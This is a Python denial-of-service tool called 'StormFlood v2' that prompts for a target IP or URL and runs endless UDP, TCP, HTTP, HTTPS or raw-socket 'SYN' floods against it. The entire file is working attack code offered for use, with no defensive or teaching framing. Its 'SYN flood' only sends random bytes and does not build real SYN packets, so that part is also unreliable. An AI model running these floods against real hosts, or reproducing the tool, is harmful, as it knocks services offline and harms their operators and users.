import socket
import random
import os
import threading
import requests
import sys

# Clear the console
os.system("clear" if os.name == "posix" else "cls")

banner = """
\033[1;31m   ____  _                              _____ _           _ 
  / ___|| |_ ___  _ __ ___   ___  _ __ | ___(_)_ __   __| |
  \___ \| __/ _ \\| '_ ` _ \\ / _ \\| '_ \\| |_  | | '_ \\ / _` |
   ___) | || (_) | | | | | | (_) | | | |  _| | | | | | (_| |
  |____/ \\__\\___/|_| |_| |_|\\___/|_| |_|_|   |_|_| |_|\\__,_|
\033[1;34m                     Author: creesoYT
\033[1;32m                     Program: StormFlood v2
"""

print(banner)

print("[1]: UDP Flood Attack")
print("[2]: TCP Flood Attack")
print("[3]: HTTP Flood Attack")
print("[4]: HTTPS Flood Attack")
print("[5]: SYN Flood Attack (RAW)")
choice = input("Select attack type [1/2/3/4/5]: ")
target_ip = input("Enter Target IP or URL: ")
target_port = int(input("Enter Target Port (only for TCP/UDP/SYN): "))

# For TCP/UDP/SYN → IP version selection
ip_version = socket.AF_INET  # Default
if choice in ["1", "2", "5"]:
    print("[1]: IPv4")
    print("[2]: IPv6")
    ipver_choice = input("Select IP version [1/2]: ")
    if ipver_choice == "2":
        ip_version = socket.AF_INET6

# Data size input for only TCP/UDP
data_size = 0
if choice in ["1", "2"]:
    data_size = int(input("Enter Data Size to Send (in bytes): "))


def udp():
    bytes_data = random._urandom(data_size)
    sock = socket.socket(ip_version, socket.SOCK_DGRAM)
    counter = 0
    while True:
        try:
            sock.sendto(bytes_data, (target_ip, target_port))
            counter += 1
            print(f"[UDP] Packet Sent: {counter}")
        except Exception as e:
            print(f"[UDP] Error: {e}")


def tcp():
    bytes_data = random._urandom(data_size)
    counter = 0
    while True:
        try:
            sock = socket.socket(ip_version, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(bytes_data)
            counter += 1
            print(f"[TCP] Packet Sent: {counter}")
            sock.close()
        except Exception as e:
            print(f"[TCP] Error: {e}")


def http_flood():
    counter = 0
    while True:
        try:
            r = requests.get(target_ip)
            counter += 1
            print(f"[HTTP] Request Sent: {counter}, Status: {r.status_code}")
        except Exception as e:
            print(f"[HTTP] Error: {e}")


def https_flood():
    counter = 0
    while True:
        try:
            r = requests.get(target_ip, verify=False)
            counter += 1
            print(f"[HTTPS] Request Sent: {counter}, Status: {r.status_code}")
        except Exception as e:
            print(f"[HTTPS] Error: {e}")


def syn_flood():
    counter = 0
    try:
        sock = socket.socket(ip_version, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("[SYN] You need to run this program with root privileges!")
        sys.exit(1)

    while True:
        try:
            # Random spoofed source port
            source_port = random.randint(1024, 65535)
            # TCP header structure is complicated — we simulate just basic sending here
            packet = random._urandom(40)  # Fake raw TCP SYN packet
            sock.sendto(packet, (target_ip, target_port))
            counter += 1
            print(f"[SYN] Packet Sent: {counter}")
        except Exception as e:
            print(f"[SYN] Error: {e}")


# Run selected attack
if choice == "1":
    udp()
elif choice == "2":
    tcp()
elif choice == "3":
    http_flood()
elif choice == "4":
    https_flood()
elif choice == "5":
    syn_flood()
else:
    print("Invalid option.")

